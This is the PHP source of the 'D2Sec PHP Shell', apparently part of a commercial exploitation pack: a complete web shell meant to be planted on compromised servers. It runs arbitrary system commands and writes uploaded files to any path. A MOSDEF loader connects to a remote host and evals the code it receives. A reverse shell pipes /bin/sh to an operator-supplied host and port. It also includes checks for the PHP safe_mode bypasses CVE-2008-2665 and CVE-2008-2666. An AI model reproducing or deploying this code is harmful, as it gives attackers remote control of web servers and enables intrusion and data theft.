<?php

//
// Proprietary D2 Exploitation Pack source code - use only under the license 
// agreement specified in LICENSE.txt in your D2 Exploitation Pack
//
// Copyright DSquare Security, LLC, 2007-2009
//

if(version_compare(phpversion(), '4.1.0') == -1)
{
		$_POST   = &$HTTP_POST_VARS;
		$_GET    = &$HTTP_GET_VARS;
		$_SERVER = &$HTTP_SERVER_VARS;
		$_COOKIE = &$HTTP_COOKIE_VARS;
		$_ENV    = &$HTTP_ENV_VARS;
}

if (@get_magic_quotes_gpc())
{
	foreach ($_POST as $k=>$v)
	{
		$_POST[$k] = stripslashes($v);
	}
	foreach ($_COOKIE as $k=>$v)
	{
		$_COOKIE[$k] = stripslashes($v);
	}
}

$dir = @getcwd();
$unix = 0;
if (strlen($dir)>1 && $dir[1]==":") $unix=0; else $unix=1;

error_reporting(0);
set_time_limit(0);

$error = "";

// Functions
function ex($cfe)
{
	$res = '';
	if (!empty($cfe))
		{
			if(function_exists('exec'))
				{
					@exec($cfe,$res);
					$res = join("\n",$res);
				}
			elseif(function_exists('shell_exec'))
				{
					$res = @shell_exec($cfe);
				}
			elseif(function_exists('system'))
				{
					@ob_start();
					@system($cfe);
					$res = @ob_get_contents();
					@ob_end_clean();
				}
			elseif(function_exists('passthru'))
				{
					@ob_start();
					@passthru($cfe);
					$res = @ob_get_contents();
					@ob_end_clean();
				}
			elseif(@is_resource($f = @popen($cfe,"r")))
				{
					$res = "";
					while(!@feof($f)) { $res .= @fread($f,1024); }
					@pclose($f);
				}
		}
	return $res;
}

function perms($mode)
{
	if (!$GLOBALS['unix']) return 0;
	if( $mode & 0x1000 ) { $type='p'; }
	else if( $mode & 0x2000 ) { $type='c'; }
	else if( $mode & 0x4000 ) { $type='d'; }
	else if( $mode & 0x6000 ) { $type='b'; }
	else if( $mode & 0x8000 ) { $type='-'; }
	else if( $mode & 0xA000 ) { $type='l'; }
	else if( $mode & 0xC000 ) { $type='s'; }
	else $type='u';
	$owner["read"] = ($mode & 00400) ? 'r' : '-';
	$owner["write"] = ($mode & 00200) ? 'w' : '-';
	$owner["execute"] = ($mode & 00100) ? 'x' : '-';
	$group["read"] = ($mode & 00040) ? 'r' : '-';
	$group["write"] = ($mode & 00020) ? 'w' : '-';
	$group["execute"] = ($mode & 00010) ? 'x' : '-';
	$world["read"] = ($mode & 00004) ? 'r' : '-';
	$world["write"] = ($mode & 00002) ? 'w' : '-';
	$world["execute"] = ($mode & 00001) ? 'x' : '-';
	if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
	if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
	if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
	$s=sprintf("%1s", $type);
	$s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
	$s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
	$s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
	return trim($s);
}

if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safe_mode = 1; }
if (@ini_get("open_basedir") or strtolower(@ini_get("open_basedir")) == "on") { $open_basedir = 1; }
if (''==($df=@ini_get('disable_functions'))) { $disable_functions = "none"; } else { $disable_functions = $df; } 

// PHPinfo
if(isset($_GET['phpinfo'])) { echo @phpinfo(); }

// Server infos
if(!$safe_mode && $unix)
{
	if(!isset($_COOKIE['uname'])) { $uname = ex('/bin/uname -a'); setcookie('uname',$uname); } else { $uname = $_COOKIE['uname']; }
	//if(!isset($_COOKIE['id'])) { $id = ex('id'); setcookie('id',$id); } else { $id = $_COOKIE['id']; }
	if(empty($id))
	{
		if(function_exists('posix_geteuid') && function_exists('posix_getegid') && function_exists('posix_getgrgid') && function_exists('posix_getpwuid'))
		{
			$euserinfo  = @posix_getpwuid(@posix_geteuid());
			$egroupinfo = @posix_getgrgid(@posix_getegid());
	  	$id = 'uid='.$euserinfo['uid'].' ('.$euserinfo['name'].') gid='.$egroupinfo['gid'].' ('.$egroupinfo['name'].')';
		}
		else $id = "user=".@get_current_user()." uid=".@getmyuid()." gid=".@getmygid();
	}
}

// Upload
if( isset($_POST['upload']) )
{
	$tmp_file = $_FILES['from_file']['tmp_name'];

	if( !is_uploaded_file($tmp_file) )
	{
		$error = "Error in is_uploaded_file()"; 
	}

	$name_file = $_POST['to_file'];

	if( !move_uploaded_file($tmp_file, $name_file) )
	{
		$error = "Error in move_uploaded_file()"; 
	}
}

// MOSDEF
function read_block($sock) 
{
	$data=fread($sock,4);
	$size=(ord($data{0}) * (pow(2,24))) + (ord($data{1}) * pow(2,16)) + (ord($data{2}) * pow(2,8)) + ord($data{3});
	$data2="";
	while ($size > 0 ) {
		$data3=fread($sock,$size);
		if ($data3==FALSE) {
			break;
		}
		$data2=$data2.$data3;
		$size-=strlen($data3);
	}
	return $data2;
}

if(isset($_POST['mosdef_host']) && isset($_POST['mosdef_port']))
{
	$f = fsockopen($_POST['mosdef_host'], $_POST['mosdef_port']);

	if ($f) {
		while (1) {
			$data=read_block($f);
			if ($data=="") {
				break;
			}
			try {
				eval($data);
			}
			catch (Exception $e) {
			//ignore - probably all is lost, but we'll give it a shot.
			}
		}
	}
}

// Simple reverse shell
if(isset($_POST['reverse_host']) && isset($_POST['reverse_port']))
{
	$host = $_POST['reverse_host'];
	$port = $_POST['reverse_port'];
	$daemon = 0;
	$chunk_size = 1400;
	$write_a = null;
	$error_a = null;
	$shell = 'uname -a; w; id; /bin/sh -i';

	if (function_exists('pcntl_fork')) {
		$pid = pcntl_fork();
		if ($pid == -1) {
			$break;
		}

		if ($pid) {
			break;
		}

		if (posix_setsid() == -1) {
			$break;
		}

		$daemon = 1;
	} 

	chdir("/");
	umask(0);

	$sock = fsockopen($host, $port, $errno, $errstr, 30);
	if (!$sock) {
		$break;
	}

	$descriptorspec = array(
		0 => array("pipe", "r"),
		1 => array("pipe", "w"),
		2 => array("pipe", "w")
	);

	$process = proc_open($shell, $descriptorspec, $pipes);

	if (!is_resource($process)) {	
		$break;
	}

	stream_set_blocking($pipes[0], 0);
	stream_set_blocking($pipes[1], 0);
	stream_set_blocking($pipes[2], 0);
	stream_set_blocking($sock, 0);

	while (1) {
		if (feof($sock)) {
			$break;
		}

		if (feof($pipes[1])) {
			break;
		}

		$read_a = array($sock, $pipes[1], $pipes[2]);
		$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

		if (in_array($sock, $read_a)) {
			$input = fread($sock, $chunk_size);
			fwrite($pipes[0], $input);
		}

		if (in_array($pipes[1], $read_a)) {
			$input = fread($pipes[1], $chunk_size);
			fwrite($sock, $input);
		}

		if (in_array($pipes[2], $read_a)) {
			$input = fread($pipes[2], $chunk_size);
			fwrite($sock, $input);
		}
	}

	fclose($sock);
	fclose($pipes[0]);
	fclose($pipes[1]);
	fclose($pipes[2]);
	proc_close($process);
}

// Vulnerabilities
function cve_2008_2666($dir)
{
	chdir("http://../../../../../../../../" . $dir);
	$o = getcwd();

	if ($dir == $o)
		{
			return "Vulnerable";
		} 
	else
		{
			return "Not vulnerable";
		}
}

function cve_2008_2665($file)
{
	$r = 0;

	$r = posix_access("http://../../../../../../" . $file);
	if ($r == 1)
		{
			return "Vulnerable : " . $file . " exists";
		}
	else
		{
			return "Not vulnerable";
		}
}

function php_python($cmd)
{
	if (!extension_loaded('python')) return("php python extension is not installed\n");

	$py = <<<EOT
import os
f = os.popen('$cmd', "r")
res = f.readlines()
f.close()
EOT;

python_exec($py);
$foo = python_eval('res');
$res = '';
foreach ($foo as $k => $i)
{
 $res = $res . "$i<br>";
}

return $res;
}

// Code html
echo "<html>";
echo "<title>D2Sec PHP Shell</title>";
echo "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\">";
echo "<body>";
echo "<pre><h1>D2SEC PHP Shell</h1></pre>";

echo "<table><tr>";
echo "<td><pre><a href=".$_SERVER['PHP_SELF']."?phpinfo><b>phpinfo</b></a></pre></td>";
echo "</tr></table>";

if ($unix)
	{
		echo "<hr>";
		echo "<pre>";
		echo "<strong>uname</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;"; echo (!empty($uname)?$uname:"undefined"); echo "<br />";
		echo "<strong>id</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;"; echo (!empty($id)?$id:"undefined"); echo "<br />";
		echo "<strong>server software</strong>&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;"; echo $_SERVER['SERVER_SOFTWARE']; echo "<br />";
		echo "<strong>server name</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;"; echo $_SERVER['SERVER_NAME']; echo "<br />";
		echo "<strong>server addr</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;"; echo $_SERVER['SERVER_ADDR']; echo "<br />";
		echo "<strong>server port</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;"; echo $_SERVER['SERVER_PORT']; echo "<br />";
		echo "<strong>server remote addr</strong>&nbsp;:&nbsp;"; echo $_SERVER['REMOTE_ADDR']; echo "<br />";
		echo "<strong>document root</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;"; echo $_SERVER['DOCUMENT_ROOT']; echo "<br />";
		echo "<strong>pwd</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;"; echo $dir."&nbsp;"; echo '('.perms(@fileperms($dir)).')'; echo "<br />";
		echo "<strong>env path</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;"; echo $_ENV['PATH']; echo "<br />";
		echo "<strong>env lang</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;"; echo $_ENV['LANG']; echo "<br />";
		echo "<strong>safe_mode</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;"; echo (($safe_mode)?("ON"):("OFF")); echo "<br />";
		echo "<strong>open_basedir</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;"; echo (($open_basedir)?("ON"):("OFF")); echo "<br />";
		echo "<strong>disable_functions</strong>&nbsp;&nbsp;:&nbsp;"; echo $disable_functions; echo "<br />";
		echo "</pre>";
	}

if (!$safe_mode)
{
	echo "<hr>";
	echo "<pre>";
	echo "<h2>Errors</h2>";
	echo "<table>";
	echo "<tr><td><textarea name=report cols=121 rows=2>";
	echo $error;
	echo "</textarea><br><br></td></tr></table>";
}

if (!$safe_mode)
{
	echo "<hr>";
	echo "<pre>";
	echo "<h2>Basic stuffs</h2>";
	echo "<table>";
}

// Run command 
if (!$safe_mode)
{
	echo "<tr><td><form name=\"form\" method=\"POST\">Command&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=\"text\" size=\"87\" name=\"cmd\"><input type=\"submit\" value=\"Run\"></form></td></tr>";
	echo "<tr><td><textarea name=report cols=121 rows=15>";
	$cmd_rep = ex($_POST['cmd']);
	if(!$unix) 
	{ 
		echo @htmlspecialchars(@convert_cyr_string($cmd_rep,'d','w'))."\n"; 
	}
	else 
	{ 
		echo @htmlspecialchars($cmd_rep)."\n"; 
	}
	echo "</textarea><br><br></td></tr>";
}

// Upload file
if(!$safe_mode)
{
	echo "<tr><td><form name=\"upload\" enctype=\"multipart/form-data\" method=\"POST\">Upload file&nbsp;:&nbsp;&nbsp;&nbsp;<input name=\"from_file\" type=\"file\"> to &nbsp;:&nbsp;<input type=\"text\" name=\"to_file\">&nbsp;&nbsp;<input type=\"submit\" name=\"upload\" value=\"Upload\"></form></td></tr>";
}

echo "</table>";
echo "</pre>";

echo "<hr>";

// Mosdef
echo "<pre>";
echo "<h2>Mosdef</h2>";
echo "<table><tr><td>";
echo "<form name=\"mosdef\" method=\"POST\">Host&nbsp;:&nbsp;<input type=\"text\" name=\"mosdef_host\" value=\"localhost\">&nbsp;&nbsp;&nbsp;Port&nbsp;:&nbsp;<input type=\"text\" name=\"mosdef_port\" value=\"5555\">&nbsp;&nbsp;<input type=\"submit\" value=\"Run\"></form>";
echo "</td></tr></table>";
echo "</pre>";

echo "<hr>";

// Simple reverse shell
if(!$safe_mode && $unix)
{
	echo "<pre>";
	echo "<h2>Simple Reverse Shell</h2>";
	echo "<table><tr><td>";
	echo "<form name=\"reverse\" method=\"POST\">Host&nbsp;:&nbsp;<input type=\"text\" name=\"reverse_host\" value=\"localhost\">&nbsp;&nbsp;&nbsp;Port&nbsp;:&nbsp;<input type=\"text\" name=\"reverse_port\" value=\"5555\">&nbsp;&nbsp;<input type=\"submit\" value=\"Run\"></form>";
	echo "</td></tr></table>";
	echo "</pre>";
	echo "<hr>";
}

// Vulnerabilities
echo "<pre>";
echo "<h2>PHP vulnerabilities <h4>(See README for vulnerabilities details)</h4></h2>";
echo "<table>";

echo "<tr><td>---</td></tr>";

echo "<tr><td><form name=\"cve-2008-2665\" method=\"POST\"><b>CVE-2008-2665</b> - File&nbsp;:&nbsp;<input type=\"text\" name=\"cve-2008-2665-file\">&nbsp;&nbsp;<input type=\"submit\" value=\"Run\"></form></td></tr>";
if ($_POST['cve-2008-2665-file'])
{
	echo "<tr><td><b>CVE-2008-2665</b> - ";
	echo cve_2008_2665($_POST['cve-2008-2665-file']) . "\n";
	echo "</td></tr>";
}

echo "<tr><td>---</td></tr>";

echo "<tr><td><form name=\"cve-2008-2666\" method=\"POST\"><b>CVE-2008-2666</b> - Directory&nbsp;:&nbsp;<input type=\"text\" name=\"cve-2008-2666-dir\">&nbsp;&nbsp;<input type=\"submit\" value=\"Run\"></form></td></tr>";
if ($_POST['cve-2008-2666-dir'])
{
	echo "<tr><td><b>CVE-2008-2666</b> - ";
	echo cve_2008_2666($_POST['cve-2008-2666-dir']) . "\n";
	echo "</td></tr>";
}

echo "<tr><td>---</td></tr>";

echo "<tr><td><form name=\"php_python\" method=\"POST\"><b>php_python</b> - Command&nbsp;:&nbsp;<input type=\"text\" name=\"php_python_cmd\">&nbsp;&nbsp;<input type=\"submit\" value=\"Run\"></form></td></tr>";
if ($_POST['php_python_cmd'])
{
  echo "<tr><td><b>php_python</b> : <br>";
  echo php_python($_POST['php_python_cmd']) . "\n";
  echo "</td></tr>";
}

echo "</table>";
echo "</pre>";


echo "</body></html>";
?>
